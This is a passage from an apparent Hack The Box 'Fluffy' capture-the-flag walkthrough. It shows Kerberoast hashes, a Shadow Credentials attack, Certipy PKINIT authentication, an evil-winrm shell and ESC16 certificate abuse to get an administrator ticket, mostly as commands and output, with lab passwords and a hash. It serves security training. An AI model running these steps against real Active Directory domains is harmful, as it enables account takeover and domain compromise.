</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>ca_svc<span class=nv>$FLUFFY</span>.HTB<span class=nv>$fluffy</span>.htb/ca_svc*<span class=nv>$42</span>c24ce05c061a0d8a228a88dc8658ab<span class=nv>$89</span>a7e1c4fd334f2221c0ab432b7a022c1346202370343a4f44e57fb701d9d5de16a936a584b47e7d1094b574913f334867a1ab97cb1fadc9e1f963b6f9c8ba4c80edc5a37c5d5dfb321fc74f6ca89291bc96978d5dcbb011dec37bba060ec6465c90fdb49fbaebbc5b4013af094b99cbf4bc6f47905cae6f663fd4ce882802266860d4c87eecb4b855b14b690448f4b031733dae835be4d8ef7ab4ab98d0ffdb19697589c8dca094a5b4399aad388aa06c434ef96530f15a7ab265e1ff30ff4c295e571663b6e647fb7a58dd17fbb69b12e2405c14973aa91fbfc3e3b94822addce048889062953b789e9c84209fc9de47cbeb6d9f5abd264ecc509e932bc90cfa53356cea5974f69fe005e13b563a6387de61a4ef1cd9541e77443d8986b9854aac1de681491558bd4a24f081b89cef406a39e6f1f5f2a4c7a44a752d7a06ea04fb1fd4b30314844e580e3978ff5e53a9eea58095c5f9a3545b64c27ed1bd52ae82fcdd148db3f4eab07ac304fa01682ec0af5478620d068a0e8e7ba01b4f390217b417e952caccf77dc788404221e195b08a158180232dfb51a8126dc4ef0b9495399895935d7e1c01718c16868a2d168c61b2afb918d811ff354c5890fe4ed2b997a3d478b5b713fd5fd82d77f925f5a47d74d68b8f08e811fabe30d70884d31c43a0084d761f2f8767f332aa12240e85f338ebaf65984be582f1bf81ea32493970aea1204e15ad0116fa1486f004b0b40eb4310ac8f521df01aa95a27780b67692a790fdd997950f92069656c21aac51f47ec57474dc8220f78a6844e34e4dd7620a50811eb1556481ea0fa106d5ec299245850e1d6bc4b9612074021fd9a0eb0e7a1b99c2f63675660aa7108329b49ab56c129337ad5c8cad16663a4c88bef12f208156bbf8671c2b7410aa0c79f8be8cb67e41695810b6a33a56976ca2fc30b97f19a7b9bb1ee280384c88447039f7855297d604351f599e36b4427deab499788a71d4eeb4207183f9106926f3fe8e7cebd28bbb11f9ab4a2b8d42fc5ba470699ecf46dbd5ee21c8939090cc7996088fd12f9f5a30e3fea280acf1c4ad1ae348a975f42825cfbbf5a2d149f948cfc6ee74237d84d430a9394ca008299eed2692df5e5d7bf1e6e1e3dc619fb6e12c061d9e3ab19c286ea443fd4fc127c4d74c41d9ba2fdb2d3a8e77601b1d16b84ec4270722bebe79add0f16d9887127e6c7069f13f8b69401c0816608288c2c0ad2af895b9520a08903ba391e8d4a0c12f45c69a880be58d97406eed1fa99e896e69b41f127d7c210927a7335f7cca75f3834c94ff6f15078a5ea78a5b98ed9c6dcc7a235946e92e129981c567ac17f9af615b5f1e959c3cd11579cca7fd8086c9a19c6f3218d2f6b29ff3f4dfe81e202f609400daa8068a60da14572021cd5a6636792c9a639bb5e34df56146a377b948874a637b72cd4414131ee8f6e18915d858fd7706f6a3f471624209c368a90a8aaf
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Printing <span class=nb>hash</span> <span class=k>for</span> <span class=o>(</span>ldap_svc<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>ldap_svc<span class=nv>$FLUFFY</span>.HTB<span class=nv>$fluffy</span>.htb/ldap_svc*<span class=nv>$0</span>d1bb19e7077e7f4d43eacc507576b0f<span class=nv>$c883be55bb91f6314a27211e011fccb21bad2695706a368a411d863de0570c3f38a4771f41b777687a40b6e2c40893ec57e5cc7bcc0c71747d431cf2833da5b04fdf0ab35cf5674562b6b5bb7c7a8a00ed81cad2ee1effa71f3100eb8d5d3f491fe23775157569d98b8ccc9e639cfcd744cea95d7dbb45bae1493a57d690890ff88b3c7e9a5efc58452bd6117f1a9a6ef85ff17e7caf01519eb7a8afec306bfbbb79fb050c21202bb06bc2bf380acc847bb7f3496161237e2c9b68915cec66ebe231079f6df29eaa506f75ea36197fd45c4f1071de213f6b79478e0c70ca658569beb7d71f5705c8a379079bab8c6cdede508fc23f4688fdf4c8bd1bfb86bcd81bc4277055c84ea75fe964bd1f9d3e345dd325c382db790d93290742834e98d5a3f901a11313ae2a4869c83b4cee9db6eac64ee401f6fbe74fe3b3aa2774fac662556e0363c99f9bc9cdd4028372c81777d3a321a8942670d93d557645bb777263d7ce504f3cdf6ee81d70160f0abb53e46112fc0632da5a3ea41181052f0bebb70fe0bdc815d0576623da5773b18af40435e7101f2d3bc9c753251233c7c5ceca39f9e4bbc5f3133d51df762b850a7be8e71b2793e73d8458ac3d1cb90cc0a809d6ce375b3ce70a06b352dd3fef944e0d519c82855f6d4abc5c7e5e50bbd23e24e6cc4350dd3f6fc00849a9f227104cf6f64d2dc4bf55ffe72f902fac3b2679cc19cec72bf789c840910da9318b71f6116caeb4f96b97ca1b776e81f4920815557a9d653c6675d07bb37b8ec8b6802aaaaa1dc70d652c20fbe5fc8ad5388433c31c031a2b3211935e615cd0c3ec7345781f9b49a208292ee9fd3dd01673de7e4a43f1a69cfc190fb666c0d4c081bea7458aaf2ad162f5470b29f7acb5281ffaa8b68f520b4f61b03f13b7eb7f94c00734e1d0dd564af3ff627aaf69678f766c2add4c79cf3b340fa9f5780a5d08203788de987c3f9ae5d177f5487af23b87bab5c70631f4ae65bc8dea3688707bfbf10559c3199f04641817eeaab00f28a9a171b3cf9a6252d0dacd07cefa058facda46b580c66b5e4db83d3ddec0f20fe4289cd6aed3abc5e667cf36527432ae60fc61bbd916657d97a8964c6b708b67e69a31b2c2b5407e5c63bb3fd258d9ff0dfec359de055c1f50aed615e2a90d440600fa26e0df7dd837f2cbf63b1090997b75d102ff5160377dc6db5df959975c93a95ef285141ca2299d9d4f06b916411c40e7af64ec52cc0bd2648fbe4c1598878fc2613661d0fb0f6bf07abea6f5b21bff3c872f71f24b59a8c7b0d4ede43258c24a8a8bc46fd27d99900e3f72fafc2b5483892a6838320250e475c007295782ecd77cb2851ae22e69c0775009d02b5b508f86139a341a0df6760e35c77e5cd213447636c659547d76302117dc243ca12607338d32f9391f1536077dd7ce3da09854424bc2e34e31aad4d700c0455cb8ef03e80396a9ce820bb77cdb9d6b3bc838ec86</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Printing <span class=nb>hash</span> <span class=k>for</span> <span class=o>(</span>winrm_svc<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>winrm_svc<span class=nv>$FLUFFY</span>.HTB<span class=nv>$fluffy</span>.htb/winrm_svc*<span class=nv>$02572</span>feda034f31ebda665d6466a8bd5<span class=nv>$3216</span>d595c1ff5e72665f7839217fe29e1cf80cfae87c5fe2f94355752d06c417366c49037e1c23524630e97126abb3cca1b244a75a869e6702875fbcb9f2ed8a8b8350faf80fb2fa9db6de194dfc430b522428741cceda32e3d05b8fb957a7fc048746a88104080a37cfc36b0569a7549af0adb10575cf0efef91120670973c0344958a3c15cdf29c14e46f420c95fb058658e12371854ce7b52a9c92d8a8053914ebfaedad9bb20fe2c2a54372b392da362e92b32feef045ff348f4872928c5ca9edd7d094f1120fcab1a0ade9e95e18dcdc88ae90e504883aee1bc70ecdb81dd52de15b718be609908afed852faa675652bcb6f4ba8dfdce20f20376138cfe6b730b6efe644ee90d891d5f637b27e20ba6bf4358bd165148fe81b6a9a5c2c65b66ad2c36da4e751236953b302950df977a8902fcf08dfa141cc589316ab63e9a83be4106a4a7b35ee638a88da7a590f36ccb8af83dd4ae10297188cdfc517c090f6f62b8b42a6a3acd8db6e5190e38955bf07d5f18315e66cbe7812928d6e345bf24eb16d861d26c150aa64aee3f91f480bf5ad77e6a8aa086bf78431e101f8e20fbf005a7d5cc2e01a580a42895538665eb7d65c1a38260be3196480fcb8e42fda2c204357d17dd76ab43486f754d52b1cb2cfbafbe41e1e833049496729735f987f08ecef20742151453b7ac311e6349a3ab75c79ddac241d8bce5f8bcd4b897214736b8cd5a7e8397ddc7e26b337a90e36805ec8f5c9601689bac4d15cb0ada49d0974967149b5ca09c77246f31e2f1cbf6b67698c0255b5dc85a59a709a6b4d7ec3b3217008fbac9c8e837477ce7d2bae18dd3e238e2243d405118db055705f05ae6674e35289f99b9098ef30661725e349f6968b78b4250b2d653935941ec5b3fc6a5e9bf3a654a3076bc0ce2c6cb18f9b193a48cc9877ffb8195369c3dda327d98919e5fc88cc59061ecd649d889d3cb9c8958753dfb88d448d27b8edb36e39639503b9f541552c49aea0175a86a2bca4d8661040f32994d8d42b0398e89a90faa18f382671697513b11fe788ce7fe24eb4ebcbf4af3ff53c509b75c3c29bdf4864802ab668c9f7141737a3dc0a53a02af53d6c0370bf29ee332aa1be48eb3c555dd9d707c0d2f2785d4e91394c8c30a0f42bccb5e213054632f384fa71df1b2232476b60e567283305d9548f83545164a77f7af1544594f9f173da4f35d3f5ccd9498441987c7f795f648e65eeeed3385237e563ec24c407af4f9e8689af3a9db58e0b4eadd42702f391cf9d5184965f294d3af645f529250cc59de5415c713484da49078e87101f14149c34241067dca102b0a812b7681082ae219ef0473125c882b8a016c13e5d99557d396985c7e693863e74d8c1157154294013e3f63fd337c6c932381900ba6058643fb3e6c9200e96c898fdaef5d84295a4451b161f55c69e781d1dc2e9d97b56ae18476f025eb61b60dee622a81e160d82f17a9
</span></span></code></pre></div><h2 class="relative group">Shadow Credentials<div id=shadow-credentials class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#shadow-credentials aria-label=Anchor>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 /home/kali/htb/certified/pywhisker/pywhisker/pywhisker.py -d <span class=s2>&#34;fluffy.htb&#34;</span> -u <span class=s2>&#34;p.agila&#34;</span> -p <span class=s2>&#34;prometheusx-303&#34;</span> --target <span class=s2>&#34;winrm_svc&#34;</span> --action <span class=s2>&#34;add&#34;</span>   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Searching <span class=k>for</span> the target account
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Target user found: <span class=nv>CN</span><span class=o>=</span>winrm service,CN<span class=o>=</span>Users,DC<span class=o>=</span>fluffy,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Generating certificate
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Certificate generated
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Generating KeyCredential
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> KeyCredential generated with DeviceID: 
</span></span><span class=line><span class=cl>8610c333-2b13-d4cb-81f5-55e343d0a583
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Updating the msDS-KeyCredentialLink attribute of winrm_svc
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Updated the msDS-KeyCredentialLink attribute of the target object
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Converting PEM -&gt; PFX with cryptography: CyOWFEbX.pfx
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> PFX exportiert nach: CyOWFEbX.pfx
</span></span><span class=line><span class=cl><span class=o>[</span>i<span class=o>]</span> Passwort für PFX: ThyKxKWLzAyuaDKzyiLm
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Saved PFX <span class=o>(</span><span class=c1>#PKCS12) certificate &amp; key at path: CyOWFEbX.pfx</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Must be used with password: ThyKxKWLzAyuaDKzyiLm
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
</span></span></code></pre></div><p>Before we can auth with <code>Certipy</code>, we need to ensure we take the password off the .pfx file we just got.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy-ad cert -export -pfx CyOWFEbX.pfx -password ThyKxKWLzAyuaDKzyiLm -out unprotected.pfx
</span></span><span class=line><span class=cl>Certipy v5.0.3 - by Oliver Lyak <span class=o>(</span>ly4k<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Data written to <span class=s1>&#39;unprotected.pfx&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>faketime <span class=s1>&#39;2025-09-17 17:27:54&#39;</span> certipy-ad auth -pfx <span class=s2>&#34;unprotected.pfx&#34;</span> -dc-ip <span class=s1>&#39;10.10.11.69&#39;</span> -username <span class=s1>&#39;winrm_svc&#39;</span> -domain <span class=s1>&#39;fluffy.htb&#39;</span>
</span></span><span class=line><span class=cl>Certipy v5.0.3 - by Oliver Lyak <span class=o>(</span>ly4k<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Certificate identities:
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>     No identities found in this certificate
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Could not find identity in the provided certificate
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using principal: <span class=s1>&#39;winrm_svc@fluffy.htb&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying to get TGT...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got TGT
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving credential cache to <span class=s1>&#39;winrm_svc.ccache&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Wrote credential cache to <span class=s1>&#39;winrm_svc.ccache&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying to retrieve NT <span class=nb>hash</span> <span class=k>for</span> <span class=s1>&#39;winrm_svc&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got <span class=nb>hash</span> <span class=k>for</span> <span class=s1>&#39;winrm_svc@fluffy.htb&#39;</span>: REDACTED
</span></span></code></pre></div><p>Do the same for the CA_SVC account while we&rsquo;re at it</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>faketime <span class=s1>&#39;2025-09-17 17:42:08&#39;</span> certipy-ad auth -pfx ca.pfx -dc-ip 10.10.11.69 -username <span class=s1>&#39;ca_svc&#39;</span> -domain <span class=s1>&#39;fluffy.htb&#39;</span> 
</span></span><span class=line><span class=cl>Certipy v5.0.3 - by Oliver Lyak <span class=o>(</span>ly4k<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Certificate identities:
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>     No identities found in this certificate
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Could not find identity in the provided certificate
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using principal: <span class=s1>&#39;ca_svc@fluffy.htb&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying to get TGT...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got TGT
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving credential cache to <span class=s1>&#39;ca_svc.ccache&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Wrote credential cache to <span class=s1>&#39;ca_svc.ccache&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying to retrieve NT <span class=nb>hash</span> <span class=k>for</span> <span class=s1>&#39;ca_svc&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got <span class=nb>hash</span> <span class=k>for</span> <span class=s1>&#39;ca_svc@fluffy.htb&#39;</span>: REDACTED
</span></span></code></pre></div><h2 class="relative group">user.txt<div id=usertxt class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#usertxt aria-label=Anchor>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@kali<span class=o>]</span> /home/kali/Fluffy/PKINITtools <span class=o>(</span>master<span class=o>)</span> 
</span></span><span class=line><span class=cl>❯ evil-winrm -i 10.10.11.69 -u <span class=s1>&#39;winrm_svc&#39;</span> -H <span class=s1>&#39;REDACTED&#39;</span>
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Evil-WinRM shell v3.7
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class=sb>`</span>quoting_detection_proc<span class=err>&#39;</span> <span class=k>for</span> module Reline
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\w</span>inrm_svc<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ../desktop
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\w</span>inrm_svc<span class=se>\d</span>esktop&gt; ls
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\w</span>inrm_svc<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                -------------         ------ ----
</span></span><span class=line><span class=cl>-ar---        5/29/2025   7:52 AM             <span class=m>34</span> user.txt
</span></span></code></pre></div><h2 class="relative group">ESC16<div id=esc16 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#esc16 aria-label=Anchor>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy-ad find -vulnerable -u ca_svc -hashes <span class=s2>&#34;:ca0f4f9e9eb8a092addf53bb03fc98c8&#34;</span> -dc-ip 10.10.11.69
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Certificate Authorities
</span></span><span class=line><span class=cl>  <span class=m>0</span>
</span></span><span class=line><span class=cl>    CA Name                             : fluffy-DC01-CA
</span></span><span class=line><span class=cl>    DNS Name                            : DC01.fluffy.htb
</span></span><span class=line><span class=cl>    Certificate Subject                 : <span class=nv>CN</span><span class=o>=</span>fluffy-DC01-CA, <span class=nv>DC</span><span class=o>=</span>fluffy, <span class=nv>DC</span><span class=o>=</span>htb
</span></span><span class=line><span class=cl>    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
</span></span><span class=line><span class=cl>    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
</span></span><span class=line><span class=cl>    Certificate Validity End            : 3024-04-17 16:11:16+00:00
</span></span><span class=line><span class=cl>    Web Enrollment
</span></span><span class=line><span class=cl>      HTTP
</span></span><span class=line><span class=cl>        Enabled                         : False
</span></span><span class=line><span class=cl>      HTTPS
</span></span><span class=line><span class=cl>        Enabled                         : False
</span></span><span class=line><span class=cl>    User Specified SAN                  : Disabled
</span></span><span class=line><span class=cl>    Request Disposition                 : Issue
</span></span><span class=line><span class=cl>    Enforce Encryption <span class=k>for</span> Requests     : Enabled
</span></span><span class=line><span class=cl>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
</span></span><span class=line><span class=cl>    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
</span></span><span class=line><span class=cl>    Permissions
</span></span><span class=line><span class=cl>      Owner                             : FLUFFY.HTB<span class=se>\A</span>dministrators
</span></span><span class=line><span class=cl>      Access Rights
</span></span><span class=line><span class=cl>        ManageCa                        : FLUFFY.HTB<span class=se>\D</span>omain Admins
</span></span><span class=line><span class=cl>                                          FLUFFY.HTB<span class=se>\E</span>nterprise Admins
</span></span><span class=line><span class=cl>                                          FLUFFY.HTB<span class=se>\A</span>dministrators
</span></span><span class=line><span class=cl>        ManageCertificates              : FLUFFY.HTB<span class=se>\D</span>omain Admins
</span></span><span class=line><span class=cl>                                          FLUFFY.HTB<span class=se>\E</span>nterprise Admins
</span></span><span class=line><span class=cl>                                          FLUFFY.HTB<span class=se>\A</span>dministrators
</span></span><span class=line><span class=cl>        Enroll                          : FLUFFY.HTB<span class=se>\C</span>ert Publishers
</span></span><span class=line><span class=cl>    <span class=o>[</span>!<span class=o>]</span> Vulnerabilities
</span></span><span class=line><span class=cl>      ESC16                             : Security Extension is disabled.
</span></span><span class=line><span class=cl>    <span class=o>[</span>*<span class=o>]</span> Remarks
</span></span><span class=line><span class=cl>      ESC16                             : Other prerequisites may be required <span class=k>for</span> this to be exploitable. See the wiki <span class=k>for</span> more details.
</span></span><span class=line><span class=cl>Certificate Templates                   : <span class=o>[</span>!<span class=o>]</span> Could not find any certificate templates
</span></span></code></pre></div><p>ESC(ID) is a way of identifying different vulnerabilities within ADCS. There is a great github page
<a href=https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation target=_blank>HERE</a> that goes in depth into each ESC, how it works and how to exploit it.</p><p>First, we read the UPN of <code>ca_svc</code> with our user <code>p.agila</code> (GenericWrite)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy-ad account -u <span class=s1>&#39;p.agila@fluffy.htb&#39;</span> -p <span class=s1>&#39;prometheusx-303&#39;</span> -dc-ip 10.10.11.69 -user <span class=s1>&#39;ca_svc&#39;</span> <span class=nb>read</span>
</span></span><span class=line><span class=cl>Certipy v5.0.3 - by Oliver Lyak <span class=o>(</span>ly4k<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Reading attributes <span class=k>for</span> <span class=s1>&#39;ca_svc&#39;</span>:
</span></span><span class=line><span class=cl>    cn                                  : certificate authority service
</span></span><span class=line><span class=cl>    distinguishedName                   : <span class=nv>CN</span><span class=o>=</span>certificate authority service,CN<span class=o>=</span>Users,DC<span class=o>=</span>fluffy,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>    name                                : certificate authority service
</span></span><span class=line><span class=cl>    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
</span></span><span class=line><span class=cl>    sAMAccountName                      : ca_svc
</span></span><span class=line><span class=cl>    servicePrincipalName                : ADCS/ca.fluffy.htb
</span></span><span class=line><span class=cl>    userPrincipalName                   : ca_svc@fluffy.htb
</span></span><span class=line><span class=cl>    userAccountControl                  : <span class=m>66048</span>
</span></span><span class=line><span class=cl>    whenCreated                         : 2025-04-17T16:07:50+00:00
</span></span><span class=line><span class=cl>    whenChanged                         : 2025-09-17T17:43:15+00:00
</span></span></code></pre></div><p>Then change the UPN to <code>administrator</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy-ad account -u <span class=s1>&#39;p.agila@fluffy.htb&#39;</span> -p <span class=s1>&#39;prometheusx-303&#39;</span> -dc-ip 10.10.11.69 -upn <span class=s1>&#39;administrator&#39;</span> -user <span class=s1>&#39;ca_svc&#39;</span> update
</span></span><span class=line><span class=cl>Certipy v5.0.3 - by Oliver Lyak <span class=o>(</span>ly4k<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Updating user <span class=s1>&#39;ca_svc&#39;</span>:
</span></span><span class=line><span class=cl>    userPrincipalName                   : administrator
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Successfully updated <span class=s1>&#39;ca_svc&#39;</span>
</span></span></code></pre></div><p>From our <strong>Shadow Credential</strong> attack from before, export the ..cache file we got so we can use the ticket in the future</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>/home/kali/htb/fluffy/ca_svc.ccache      
</span></span><span class=line><span class=cl>                                                                            
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/fluffy<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ klist
</span></span><span class=line><span class=cl>Ticket cache: FILE:/home/kali/htb/fluffy/ca_svc.ccache
</span></span><span class=line><span class=cl>Default principal: ca_svc@FLUFFY.HTB
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Valid starting       Expires              Service principal
</span></span><span class=line><span class=cl>09/17/2025 17:43:15  09/18/2025 03:43:15  krbtgt/FLUFFY.HTB@FLUFFY.HTB
</span></span><span class=line><span class=cl>        renew <span class=k>until</span> 09/18/2025 17:42:08
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>faketime <span class=s1>&#39;2025-09-17 18:01:24&#39;</span> certipy-ad req -k -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template <span class=s1>&#39;User&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> DC host <span class=o>(</span>-dc-host<span class=o>)</span> not specified and Kerberos authentication is used. This might fail
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting certificate via RPC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Request ID is <span class=m>15</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Successfully requested certificate
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got certificate with UPN <span class=s1>&#39;administrator&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Certificate has no object SID
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Try using -sid to <span class=nb>set</span> the object SID or see the wiki <span class=k>for</span> more details
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving certificate and private key to <span class=s1>&#39;administrator.pfx&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Wrote certificate and private key to <span class=s1>&#39;administrator.pfx&#39;</span>
</span></span></code></pre></div><p>Then we need to revert the UPN back to the original</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy-ad account -u <span class=s1>&#39;p.agila@fluffy.htb&#39;</span> -p <span class=s1>&#39;prometheusx-303&#39;</span> -dc-ip 10.10.11.69 -upn <span class=s1>&#39;ca_svc@fluffy.htb&#39;</span> -user <span class=s1>&#39;ca_svc&#39;</span> update
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Updating user <span class=s1>&#39;ca_svc&#39;</span>:
</span></span><span class=line><span class=cl>    userPrincipalName                   : ca_svc@fluffy.htb
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Successfully updated <span class=s1>&#39;ca_svc&#39;</span>
</span></span></code></pre></div><h2 class="relative group">root.txt<div id=roottxt class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#roottxt aria-label=Anchor>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>faketime <span class=s1>&#39;2025-09-17 18:01:24&#39;</span> certipy-ad auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username <span class=s1>&#39;administrator&#39;</span> -domain fluffy.htb
</span></span><span class=line><span class=cl>Certipy v5.0.3 - by Oliver Lyak <span class=o>(</span>ly4k<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Certificate identities:
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>     SAN UPN: <span class=s1>&#39;administrator&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using principal: <span class=s1>&#39;administrator@fluffy.htb&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying to get TGT...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got TGT
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving credential cache to <span class=s1>&#39;administrator.ccache&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Wrote credential cache to <span class=s1>&#39;administrator.ccache&#39;</span>
